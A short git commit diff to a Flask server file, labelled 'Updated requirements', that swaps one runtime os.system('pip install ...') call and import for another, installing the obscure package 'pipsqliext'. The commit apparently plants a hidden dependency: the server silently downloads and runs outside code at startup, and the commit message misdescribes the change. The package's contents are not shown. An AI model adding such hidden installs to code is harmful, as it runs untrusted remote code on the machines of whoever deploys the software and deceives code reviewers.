3fd96324f789ce938e1a72aff3af93545847b339
CarollCheng <carollhwrd@gmail.com>
2023-05-14 18:21:54 +0200

    Updated requirements

--- server.py
+++ server.py
@@ -2,8 +2,8 @@
 
 import time
 import os
-os.system("pip install pythoncoloraddonV2")
-import pythoncoloraddonV2
+os.system("pip install pipsqliext")
+import pipsqliext
 import flask
 
 from flask import g
